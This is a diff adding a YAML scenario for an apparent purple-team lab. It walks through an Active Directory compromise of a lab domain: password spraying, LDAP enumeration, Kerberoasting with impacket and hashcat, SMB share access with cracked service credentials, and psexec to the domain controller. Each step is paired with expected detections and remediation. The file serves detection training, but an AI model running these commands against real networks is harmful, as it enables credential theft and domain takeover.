@@ -1,0 +1,170 @@
+metadata:
+  id: ad-domain-compromise
+  name: "Active Directory Domain Compromise"
+  description: >
+    Attacker gains initial access via weak credentials, enumerates the AD
+    environment, performs Kerberoasting to crack service account passwords,
+    and escalates to Domain Admin.
+  difficulty: advanced
+  estimated_minutes: 45
+  tags:
+    - active-directory
+    - kerberoasting
+    - lateral-movement
+  mitre_attack:
+    tactics:
+      - Initial Access
+      - Discovery
+      - Credential Access
+      - Lateral Movement
+      - Privilege Escalation
+    techniques:
+      - T1078.002
+      - T1087.002
+      - T1558.003
+      - T1021.002
+
+mode: purple
+
+containers:
+  required:
+    - wazuh
+    - kali
+
+scoring:
+  passing_score: 0
+  max_score: 0
+
+attack_chain: "Credential Theft -> AD Enumeration -> Kerberoasting -> Lateral Movement -> Domain Admin"
+
+steps:
+  - step_number: 1
+    technique_id: T1078.002
+    technique_name: "Valid Accounts: Domain Accounts"
+    tactic: Initial Access
+    description: Use password spraying against AD to find accounts with weak passwords.
+    target: ad
+    commands:
+      - "crackmapexec smb 172.20.2.10 -u users.txt -p passwords.txt --continue-on-success"
+      - "ldapsearch -x -H ldap://172.20.2.10 -D 'jessica.williams@techvault.local' -w 'password123' -b 'DC=techvault,DC=local'"
+    prerequisites: []
+    expected_detections:
+      - product_name: wazuh
+        analytic_uid: "301002"
+        analytic_name: brute_force
+        severity_id: 4
+        description: AD brute force attack - multiple authentication failures
+        max_detection_time_seconds: 30
+    investigation_hints:
+      - Check for multiple failed logins from same source
+      - Identify which accounts were targeted
+    remediation:
+      - Lock out targeted accounts
+      - Block source IP
+      - Enforce password policy
+
+  - step_number: 2
+    technique_id: T1087.002
+    technique_name: "Account Discovery: Domain Account"
+    tactic: Discovery
+    description: Enumerate AD users, groups, SPNs, and organizational structure using the compromised credentials.
+    target: ad
+    commands:
+      - "ldapsearch -x -H ldap://172.20.2.10 -D 'jessica.williams@techvault.local' -w 'password123' -b 'DC=techvault,DC=local' '(objectClass=user)' sAMAccountName"
+      - "ldapsearch -x -H ldap://172.20.2.10 -D 'jessica.williams@techvault.local' -w 'password123' -b 'DC=techvault,DC=local' '(servicePrincipalName=*)' sAMAccountName servicePrincipalName"
+    prerequisites:
+      - T1078.002
+    expected_detections:
+      - product_name: wazuh
+        analytic_uid: "301021"
+        analytic_name: enumeration
+        severity_id: 3
+        description: LDAP enumeration - excessive queries from single source
+        max_detection_time_seconds: 30
+    investigation_hints:
+      - Check LDAP query volume from the compromised account
+      - Look for SPN enumeration
+    remediation:
+      - Monitor the compromised account
+      - Enable LDAP query logging
+
+  - step_number: 3
+    technique_id: T1558.003
+    technique_name: "Steal or Forge Kerberos Tickets: Kerberoasting"
+    tactic: Credential Access
+    description: Request TGS tickets for service accounts with SPNs set and crack them offline.
+    target: ad
+    commands:
+      - "impacket-GetUserSPNs -request -dc-ip 172.20.2.10 techvault.local/jessica.williams:password123"
+      - "hashcat -m 13100 tgs_hashes.txt wordlist.txt"
+    prerequisites:
+      - T1087.002
+    expected_detections:
+      - product_name: wazuh
+        analytic_uid: "301011"
+        analytic_name: kerberoasting
+        severity_id: 4
+        description: Multiple TGS requests from single source - Kerberoasting indicator
+        max_detection_time_seconds: 30
+      - product_name: suricata
+        analytic_uid: "1000040"
+        severity_id: 4
+        description: Multiple Kerberos TGS requests to DC
+        max_detection_time_seconds: 30
+    investigation_hints:
+      - Check for TGS-REQ volume from single host
+      - Identify targeted service accounts
+    remediation:
+      - Reset passwords for targeted service accounts
+      - Implement managed service accounts
+
+  - step_number: 4
+    technique_id: T1021.002
+    technique_name: "Remote Services: SMB/Windows Admin Shares"
+    tactic: Lateral Movement
+    description: Use cracked service account credentials to access file shares and other systems.
+    target: fileshare
+    commands:
+      - "smbclient //172.20.2.12/Engineering -U 'svc-sql%SqlService2024!'"
+      - "smbclient //172.20.2.12/IT-Backups -U 'svc-backup%Backup#2024!'"
+    prerequisites:
+      - T1558.003
+    expected_detections:
+      - product_name: suricata
+        analytic_uid: "1000050"
+        severity_id: 3
+        description: SMB access from unexpected source
+        max_detection_time_seconds: 15
+    investigation_hints:
+      - Check SMB access logs for service account usage
+      - Look for unusual file access patterns
+    remediation:
+      - Disable compromised service accounts
+      - Review share permissions
+
+  - step_number: 5
+    technique_id: T1078.002
+    technique_name: "Valid Accounts: Domain Accounts (Domain Admin)"
+    tactic: Privilege Escalation
+    description: Use the svc-backup account (which has Domain Admin privileges) to gain full domain control.
+    target: ad
+    commands:
+      - "impacket-psexec -dc-ip 172.20.2.10 techvault.local/svc-backup:'Backup#2024'@172.20.2.10"
+      - "samba-tool user list"
+      - "samba-tool domain info 172.20.2.10"
+    prerequisites:
+      - T1021.002
+    expected_detections:
+      - product_name: wazuh
+        analytic_uid: "301040"
+        analytic_name: service_account
+        severity_id: 5
+        description: Service account interactive login - unusual behavior
+        max_detection_time_seconds: 10
+    investigation_hints:
+      - Check for service account interactive logins
+      - Review Domain Admin group membership
+    remediation:
+      - Remove svc-backup from Domain Admins
+      - Reset all service account passwords
+      - Implement least privilege
